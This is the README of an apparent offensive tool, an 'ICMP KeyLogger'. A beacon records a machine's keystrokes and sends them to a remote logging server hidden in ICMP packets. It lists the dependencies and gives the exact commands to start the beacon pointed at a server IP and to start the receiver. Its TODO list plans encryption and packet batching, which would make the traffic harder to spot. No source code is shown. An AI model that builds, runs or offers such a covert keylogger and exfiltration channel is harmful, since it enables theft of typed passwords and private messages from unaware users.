# ICMP KeyLogger

## Introduction
ICMP KeyLogger is a tool designed to capture and transmit keystrokes over the network using ICMP packets. It is divided into two main components: the Beacon, which captures keystrokes and sends them, and the Server, which receives and logs these keystrokes.

### TODO
- Implement encryption for keystroke data.
- Group packets to optimize network traffic instead of sending keystrokes instantly.

## Requirements
### Windows
- [npcap](https://nmap.org/npcap/)
- pynput
- scapy

### Linux
- pynput
- scapy

## Usage
Identifying Network Interface on Windows

To find the full name of the network interface:

cmd

ipconfig /all

Use the Description field of the relevant interface.
Running the Beacon

cmd

py ICMPbeacon.py -i "[Description from ipconfig /all]" -d [keylogger server IP]

Running the Server

bash

sudo python3 ICMPlogServ.py -i [listening interface] -d [beacon IP]
